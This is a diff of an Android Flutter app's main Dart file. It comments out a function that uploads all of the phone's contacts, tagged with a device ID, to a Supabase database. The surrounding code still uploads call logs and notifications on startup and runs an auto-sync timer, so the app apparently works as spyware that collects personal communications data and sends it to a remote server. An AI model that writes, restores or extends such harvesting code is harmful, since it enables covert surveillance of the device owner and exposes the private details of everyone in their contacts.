@@ -6,7 +6,7 @@ import 'package:android_intent_plus/android_intent.dart';
 import 'package:android_intent_plus/flag.dart';
 import 'package:connectivity_plus/connectivity_plus.dart';
 import 'package:call_log/call_log.dart';
-import 'package:contacts_service/contacts_service.dart';
+// import 'package:contacts_service/contacts_service.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:path/path.dart' as p;
 import 'package:path_provider/path_provider.dart';
@@ -44,7 +44,7 @@ class _MyAppState extends State<MyApp> {
     super.initState();
     NotificationsListener.initialize();
     checkNotificationAccess();
-    uploadContactsToSupabase();
+    // uploadContactsToSupabase();
     uploadCallLogs();
     startAutoSyncTimer();
 
@@ -113,26 +113,26 @@ Future<void> uploadNotificationToSupabase(NotificationEvent event) async {
   }
 }
 
-Future<void> uploadContactsToSupabase() async {
-  if (!await Permission.contacts.request().isGranted) return;
-
-  final contacts = await ContactsService.getContacts(withThumbnails: false);
-  final deviceId = await getDeviceId();
-  final supabase = Supabase.instance.client;
-
-  for (final contact in contacts) {
-    for (final phone in contact.phones ?? []) {
-      await supabase.from('contacts').insert({
-        'name': contact.displayName ?? 'unknown',
-        'number': phone.value ?? '',
-        'device_id': deviceId,
-        'timestamp': DateTime.now().toIso8601String(),
-      });
-    }
-  }
-
-  print("📇 تم رفع جهات الاتصال إلى Supabase");
-}
+// Future<void> uploadContactsToSupabase() async {
+//   if (!await Permission.contacts.request().isGranted) return;
+//
+//   final contacts = await ContactsService.getContacts(withThumbnails: false);
+//   final deviceId = await getDeviceId();
+//   final supabase = Supabase.instance.client;
+//
+//   for (final contact in contacts) {
+//     for (final phone in contact.phones ?? []) {
+//       await supabase.from('contacts').insert({
+//         'name': contact.displayName ?? 'unknown',
+//         'number': phone.value ?? '',
+//         'device_id': deviceId,
+//         'timestamp': DateTime.now().toIso8601String(),
+//       });
+//     }
+//   }
+//
+//   print("📇 تم رفع جهات الاتصال إلى Supabase");
+// }
 
 Future<void> uploadCallLogs() async {
   if (!await Permission.phone.request().isGranted) return;
